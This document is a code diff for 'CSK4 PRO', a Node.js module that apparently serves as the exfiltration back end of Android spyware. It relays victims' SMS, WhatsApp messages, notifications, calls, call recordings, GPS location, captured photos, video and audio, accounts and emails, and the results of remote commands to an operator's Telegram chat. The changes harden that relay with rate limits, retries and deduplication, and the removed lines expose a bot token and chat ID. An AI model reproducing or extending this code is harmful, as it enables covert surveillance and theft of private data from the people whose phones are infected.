@@ -1,19 +1,22 @@
 // ============================================
-// CSK4 PRO v4.0 - Telegram Bot Integration
+// CSK4 PRO v4.2 - Telegram Bot Integration (FIXED)
 // ============================================
-// Ye file Telegram Bot se connect karti hai
-// Aur instant notifications bhejti hai
-// Email se FAST — 1-2 second mein
+// FIXES:
+// - No hardcoded token (env only)
+// - Queue cap (500 max)
+// - Retry limit (3 attempts)
+// - Better rate limit (sliding window)
+// - Complete escapeHtml (quotes)
+// - Deduplication
+// - No infinite loop
 // ============================================
 
 const TelegramBot = require('node-telegram-bot-api');
+const crypto = require('crypto');
 
 // ============ CONFIG ============
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 
-  '8393657326:AAFvHQjOcbgKqcMpiFn8lQbZtc3VipPXUvI';
-
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID || 
-  '8181910370';
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 // ============ STATE ============
 let bot = null;
@@ -21,15 +24,57 @@ let isEnabled = false;
 let messageQueue = [];
 let isSending = false;
 
-// ============ RATE LIMIT ============
+// ============ RATE LIMIT (sliding window) ============
 const RATE_LIMIT = {
   maxPerMinute: 20,
   maxPerSecond: 1,
-  sentThisMinute: 0,
-  sentThisSecond: 0,
-  minuteReset: Date.now(),
-  secondReset: Date.now()
+  sentTimestamps: [],
 };
+
+// ✅ Deduplication
+const recentMessages = new Map();
+const DEDUP_WINDOW = 60 * 1000;
+
+function getMessageHash(text) {
+  return crypto.createHash('md5').update(text).digest('hex');
+}
+
+function isDuplicate(text) {
+  const hash = getMessageHash(text);
+  const now = Date.now();
+  const last = recentMessages.get(hash);
+  
+  if (last && (now - last) < DEDUP_WINDOW) return true;
+  
+  recentMessages.set(hash, now);
+  
+  if (recentMessages.size > 500) {
+    for (const [k, v] of recentMessages) {
+      if (now - v > DEDUP_WINDOW) recentMessages.delete(k);
+    }
+  }
+  return false;
+}
+
+// ✅ Sliding window rate limit
+function canSend() {
+  const now = Date.now();
+  const oneMinuteAgo = now - 60000;
+  const oneSecondAgo = now - 1000;
+  
+  // Clean old timestamps
+  RATE_LIMIT.sentTimestamps = RATE_LIMIT.sentTimestamps.filter(t => t > oneMinuteAgo);
+  
+  // Check limits
+  const lastMinute = RATE_LIMIT.sentTimestamps.length;
+  const lastSecond = RATE_LIMIT.sentTimestamps.filter(t => t > oneSecondAgo).length;
+  
+  if (lastMinute >= RATE_LIMIT.maxPerMinute) return false;
+  if (lastSecond >= RATE_LIMIT.maxPerSecond) return false;
+  
+  RATE_LIMIT.sentTimestamps.push(now);
+  return true;
+}
 
 // ============ INITIALIZE BOT ============
 function init() {
@@ -40,16 +85,13 @@ function init() {
 
   try {
     bot = new TelegramBot(BOT_TOKEN, { 
-      polling: false,  // We don't need to receive messages
+      polling: false,
       webHook: false
     });
 
     isEnabled = true;
     console.log('📱 Telegram Bot initialized');
     console.log(`   Chat ID: ${CHAT_ID}`);
-
-    // Send startup message
-    sendMessage('🟢 <b>CSK4 Server Started</b>\n\nServer is online and ready to receive data.');
 
     return true;
   } catch (error) {
@@ -59,50 +101,31 @@ function init() {
   }
 }
 
-// ============ RATE LIMIT CHECK ============
-function canSend() {
-  const now = Date.now();
-
-  // Reset counters
-  if (now - RATE_LIMIT.minuteReset > 60000) {
-    RATE_LIMIT.sentThisMinute = 0;
-    RATE_LIMIT.minuteReset = now;
-  }
-  if (now - RATE_LIMIT.secondReset > 1000) {
-    RATE_LIMIT.sentThisSecond = 0;
-    RATE_LIMIT.secondReset = now;
-  }
-
-  // Check limits
-  if (RATE_LIMIT.sentThisMinute >= RATE_LIMIT.maxPerMinute) {
-    return false;
-  }
-  if (RATE_LIMIT.sentThisSecond >= RATE_LIMIT.maxPerSecond) {
-    return false;
-  }
-
-  RATE_LIMIT.sentThisMinute++;
-  RATE_LIMIT.sentThisSecond++;
-  return true;
-}
-
 // ============ SEND MESSAGE ============
 async function sendMessage(text, options = {}) {
   if (!isEnabled || !bot) {
-    console.log('⚠️ Telegram not enabled, skipping message');
+    console.log('⚠️ Telegram not enabled');
+    return false;
+  }
+
+  // ✅ Dedup
+  if (isDuplicate(text)) {
     return false;
   }
 
   // Rate limit
   if (!canSend()) {
-    console.log('⚠️ Telegram rate limit — queueing message');
-    messageQueue.push({ text, options });
+    // ✅ Cap queue
+    if (messageQueue.length >= 500) {
+      messageQueue.shift();
+    }
+    messageQueue.push({ text, options, retries: 0 });
     processQueue();
     return false;
   }
 
   try {
-    const result = await bot.sendMessage(CHAT_ID, text, {
+    await bot.sendMessage(CHAT_ID, text, {
       parse_mode: 'HTML',
       disable_web_page_preview: true,
       ...options
@@ -121,11 +144,20 @@ async function processQueue() {
 
   while (messageQueue.length > 0) {
     if (!canSend()) {
-      await new Promise(r => setTimeout(r, 2000));
+      // ✅ Max 5 sec wait
+      await new Promise(r => setTimeout(r, Math.min(2000, 5000)));
       continue;
     }
 
     const msg = messageQueue.shift();
+    const retries = (msg.retries || 0) + 1;
+    
+    // ✅ Retry limit
+    if (retries > 3) {
+      console.log('⚠️ Dropped message after 3 retries');
+      continue;
+    }
+
     try {
       await bot.sendMessage(CHAT_ID, msg.text, {
         parse_mode: 'HTML',
@@ -133,7 +165,16 @@ async function processQueue() {
         ...msg.options
       });
     } catch (error) {
-      console.error('❌ Queue send failed:', error.message);
+      const em = error.message || '';
+      if (em.includes('429')) {
+        const m = em.match(/retry after (\d+)/);
+        const waitSec = m ? parseInt(m[1]) : 10;
+        console.log(`⏳ TG rate limit — waiting ${waitSec}s`);
+        messageQueue.unshift({ ...msg, retries });
+        await new Promise(r => setTimeout(r, waitSec * 1000));
+      } else {
+        console.error('❌ Queue send failed:', em);
+      }
     }
   }
 
@@ -142,8 +183,7 @@ async function processQueue() {
 
 // ============ SEND PHOTO ============
 async function sendPhoto(photoUrl, caption = '') {
-  if (!isEnabled || !bot) return false;
-  if (!canSend()) return false;
+  if (!isEnabled || !bot || !canSend()) return false;
 
   try {
     await bot.sendPhoto(CHAT_ID, photoUrl, {
@@ -157,10 +197,9 @@ async function sendPhoto(photoUrl, caption = '') {
   }
 }
 
-// ============ SEND DOCUMENT (Audio/Video) ============
+// ============ SEND DOCUMENT ============
 async function sendDocument(documentUrl, caption = '') {
-  if (!isEnabled || !bot) return false;
-  if (!canSend()) return false;
+  if (!isEnabled || !bot || !canSend()) return false;
 
   try {
     await bot.sendDocument(CHAT_ID, documentUrl, {
@@ -176,8 +215,7 @@ async function sendDocument(documentUrl, caption = '') {
 
 // ============ SEND AUDIO ============
 async function sendAudio(audioUrl, caption = '') {
-  if (!isEnabled || !bot) return false;
-  if (!canSend()) return false;
+  if (!isEnabled || !bot || !canSend()) return false;
 
   try {
     await bot.sendAudio(CHAT_ID, audioUrl, {
@@ -191,10 +229,25 @@ async function sendAudio(audioUrl, caption = '') {
   }
 }
 
+// ============ SEND VIDEO ============
+async function sendVideo(videoUrl, caption = '') {
+  if (!isEnabled || !bot || !canSend()) return false;
+
+  try {
+    await bot.sendVideo(CHAT_ID, videoUrl, {
+      caption: caption,
+      parse_mode: 'HTML'
+    });
+    return true;
+  } catch (error) {
+    console.error('❌ Telegram video failed:', error.message);
+    return false;
+  }
+}
+
 // ============ SEND LOCATION ============
 async function sendLocation(lat, lng) {
-  if (!isEnabled || !bot) return false;
-  if (!canSend()) return false;
+  if (!isEnabled || !bot || !canSend()) return false;
 
   try {
     await bot.sendLocation(CHAT_ID, lat, lng);
@@ -207,7 +260,6 @@ async function sendLocation(lat, lng) {
 
 // ============ NOTIFICATION TEMPLATES ============
 
-// 🆕 Device Online
 async function notifyDeviceOnline(deviceName, deviceId, model, android, battery) {
   const text = `🟢 <b>Device Online</b>
 
@@ -218,11 +270,9 @@ async function notifyDeviceOnline(deviceName, deviceId, model, android, battery)
 🔋 <b>Battery:</b> ${battery}%
 
 ⏰ ${new Date().toLocaleString()}`;
-  
   return await sendMessage(text);
 }
 
-// 📍 Location Update
 async function notifyLocation(deviceName, lat, lng, accuracy) {
   const mapsUrl = `https://maps.google.com/?q=${lat},${lng}`;
   const text = `📍 <b>Location Update</b>
@@ -234,16 +284,13 @@ async function notifyLocation(deviceName, lat, lng, accuracy) {
 <a href="${mapsUrl}">🗺️ Open in Maps</a>
 
 ⏰ ${new Date().toLocaleString()}`;
-  
   return await sendMessage(text);
 }
 
-// 💬 New SMS
 async function notifySMS(deviceName, from, body, senderName) {
   const displayFrom = senderName && senderName !== 'Unknown' 
     ? `${escapeHtml(senderName)} (${from})` 
     : from;
-  
   const text = `💬 <b>New SMS</b>
 
 📱 <b>Device:</b> ${escapeHtml(deviceName)}
@@ -252,11 +299,9 @@ async function notifySMS(deviceName, from, body, senderName) {
 <i>${escapeHtml(body)}</i>
 
 ⏰ ${new Date().toLocaleString()}`;
-  
   return await sendMessage(text);
 }
 
-// 💬 WhatsApp Message
 async function notifyWhatsApp(deviceName, from, message) {
   const text = `💬 <b>WhatsApp Message</b>
 
@@ -266,11 +311,9 @@ async function notifyWhatsApp(deviceName, from, message) {
 <i>${escapeHtml(message)}</i>
 
 ⏰ ${new Date().toLocaleString()}`;
-  
   return await sendMessage(text);
 }
 
-// 🔔 Notification
 async function notifyNotification(deviceName, appName, title, text) {
   const message = `🔔 <b>Notification</b>
 
@@ -280,19 +323,12 @@ async function notifyNotification(deviceName, appName, title, text) {
 📝 <b>Text:</b> <i>${escapeHtml(text || 'No text')}</i>
 
 ⏰ ${new Date().toLocaleString()}`;
-  
   return await sendMessage(message);
 }
 
-// 📞 Call
 async function notifyCall(deviceName, number, name, type, duration) {
-  const typeEmoji = {
-    1: '📥', 2: '📤', 3: '❌', 4: '📮', 5: '🚫', 6: '⏱️'
-  };
-  const typeText = {
-    1: 'Incoming', 2: 'Outgoing', 3: 'Missed', 4: 'Voicemail', 5: 'Rejected', 6: 'Blocked'
-  };
-
+  const typeEmoji = { 1: '📥', 2: '📤', 3: '❌', 4: '📮', 5: '🚫', 6: '⏱️' };
+  const typeText = { 1: 'Incoming', 2: 'Outgoing', 3: 'Missed', 4: 'Voicemail', 5: 'Rejected', 6: 'Blocked' };
   const text = `${typeEmoji[type] || '📞'} <b>Call ${typeText[type] || 'Event'}</b>
 
 📱 <b>Device:</b> ${escapeHtml(deviceName)}
@@ -301,11 +337,9 @@ async function notifyCall(deviceName, number, name, type, duration) {
 ⏱️ <b>Duration:</b> ${duration}s
 
 ⏰ ${new Date().toLocaleString()}`;
-  
   return await sendMessage(text);
 }
 
-// 🆕 New Contact
 async function notifyContact(deviceName, name, phone, type) {
   const text = `🆕 <b>New Contact</b>
 
@@ -315,41 +349,33 @@ async function notifyContact(deviceName, name, phone, type) {
 📱 <b>Type:</b> ${type || 'Mobile'}
 
 ⏰ ${new Date().toLocaleString()}`;
-  
   return await sendMessage(text);
 }
 
-// 📷 Photo
 async function notifyPhoto(deviceName, photoUrl) {
   const caption = `📷 <b>Photo Captured</b>
 
 📱 <b>Device:</b> ${escapeHtml(deviceName)}
 ⏰ ${new Date().toLocaleString()}`;
-  
   return await sendPhoto(photoUrl, caption);
 }
 
-// 🎥 Video
 async function notifyVideo(deviceName, videoUrl) {
   const caption = `🎥 <b>Video Recorded</b>
 
 📱 <b>Device:</b> ${escapeHtml(deviceName)}
 ⏰ ${new Date().toLocaleString()}`;
-  
-  return await sendDocument(videoUrl, caption);
+  return await sendVideo(videoUrl, caption);
 }
 
-// 🎤 Audio
 async function notifyAudio(deviceName, audioUrl) {
   const caption = `🎤 <b>Audio Recorded</b>
 
 📱 <b>Device:</b> ${escapeHtml(deviceName)}
 ⏰ ${new Date().toLocaleString()}`;
-  
   return await sendAudio(audioUrl, caption);
 }
 
-// 🎙️ Call Recording
 async function notifyCallRecording(deviceName, number, duration, audioUrl) {
   const caption = `🎙️ <b>Call Recording</b>
 
@@ -358,11 +384,9 @@ async function notifyCallRecording(deviceName, number, duration, audioUrl) {
 ⏱️ <b>Duration:</b> ${duration}s
 
 ⏰ ${new Date().toLocaleString()}`;
-  
   return await sendDocument(audioUrl, caption);
 }
 
-// 📊 Activity
 async function notifyActivity(deviceName, type, data) {
   const text = `📊 <b>Activity: ${type}</b>
 
@@ -370,15 +394,12 @@ async function notifyActivity(deviceName, type, data) {
 📋 <b>Data:</b> <code>${escapeHtml(JSON.stringify(data))}</code>
 
 ⏰ ${new Date().toLocaleString()}`;
-  
   return await sendMessage(text);
 }
 
-// 🔋 Battery Alert
 async function notifyBattery(deviceName, level, isCharging) {
   const emoji = isCharging ? '🔌' : (level <= 15 ? '🔴' : '🔋');
   const status = isCharging ? 'Charging' : 'On Battery';
-
   const text = `${emoji} <b>Battery Alert</b>
 
 📱 <b>Device:</b> ${escapeHtml(deviceName)}
@@ -386,11 +407,9 @@ async function notifyBattery(deviceName, level, isCharging) {
 ⚡ <b>Status:</b> ${status}
 
 ⏰ ${new Date().toLocaleString()}`;
-  
   return await sendMessage(text);
 }
 
-// 📱 SIM Info
 async function notifySimInfo(deviceName, sims) {
   let simText = '';
   if (sims && sims.length > 0) {
@@ -401,18 +420,15 @@ async function notifySimInfo(deviceName, sims) {
       simText += `  📶 ${sim.networkType || 'N/A'}\n`;
     });
   }
-
   const text = `📱 <b>SIM Info</b>
 
 📱 <b>Device:</b> ${escapeHtml(deviceName)}
 ${simText}
 
 ⏰ ${new Date().toLocaleString()}`;
-  
   return await sendMessage(text);
 }
 
-// 👤 Accounts
 async function notifyAccounts(deviceName, accounts) {
   let accText = '';
   if (accounts && accounts.length > 0) {
@@ -420,7 +436,6 @@ async function notifyAccounts(deviceName, accounts) {
       accText += `\n📧 ${escapeHtml(acc.name)}\n  Type: ${acc.type}\n`;
     });
   }
-
   const text = `👤 <b>Accounts Found</b>
 
 📱 <b>Device:</b> ${escapeHtml(deviceName)}
@@ -428,11 +443,9 @@ async function notifyAccounts(deviceName, accounts) {
 ${accText}
 
 ⏰ ${new Date().toLocaleString()}`;
-  
   return await sendMessage(text);
 }
 
-// 📧 Emails
 async function notifyEmails(deviceName, emails) {
   let emailText = '';
   if (emails && emails.length > 0) {
@@ -440,7 +453,6 @@ async function notifyEmails(deviceName, emails) {
       emailText += `\n📧 ${escapeHtml(email)}`;
     });
   }
-
   const text = `📧 <b>Email Accounts</b>
 
 📱 <b>Device:</b> ${escapeHtml(deviceName)}
@@ -448,11 +460,9 @@ async function notifyEmails(deviceName, emails) {
 ${emailText}
 
 ⏰ ${new Date().toLocaleString()}`;
-  
   return await sendMessage(text);
 }
 
-// 🎮 Command Result
 async function notifyCommand(deviceName, command, result) {
   const text = `🎮 <b>Command Executed</b>
 
@@ -461,34 +471,32 @@ async function notifyCommand(deviceName, command, result) {
 ✅ <b>Result:</b> ${escapeHtml(result)}
 
 ⏰ ${new Date().toLocaleString()}`;
-  
   return await sendMessage(text);
 }
 
-// 🚨 System Alert
 async function notifySystem(title, message) {
   const text = `🚨 <b>${escapeHtml(title)}</b>
 
 ${escapeHtml(message)}
 
 ⏰ ${new Date().toLocaleString()}`;
-  
   return await sendMessage(text);
 }
 
-// ============ ESCAPE HTML ============
+// ============ ESCAPE HTML (FIXED — quotes included) ============
 function escapeHtml(text) {
   if (!text) return '';
   return String(text)
     .replace(/&/g, '&amp;')
     .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;');
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
 }
 
 // ============ TEST ============
 async function test() {
-  const success = await sendMessage('🧪 <b>Test Message</b>\n\nCSK4 Telegram Bot is working!');
-  return success;
+  return await sendMessage('🧪 <b>Test Message</b>\n\nCSK4 Telegram Bot is working!');
 }
 
 // ============ STATUS ============
@@ -498,8 +506,7 @@ function getStatus() {
     hasBot: !!bot,
     chatId: CHAT_ID,
     queueLength: messageQueue.length,
-    sentThisMinute: RATE_LIMIT.sentThisMinute,
-    sentThisSecond: RATE_LIMIT.sentThisSecond
+    recentCount: RATE_LIMIT.sentTimestamps.length
   };
 }
 
@@ -508,13 +515,13 @@ module.exports = {
   init,
   sendMessage,
   sendPhoto,
+  sendVideo,
   sendDocument,
   sendAudio,
   sendLocation,
   test,
   getStatus,
   
-  // Notification templates
   notifyDeviceOnline,
   notifyLocation,
   notifySMS,
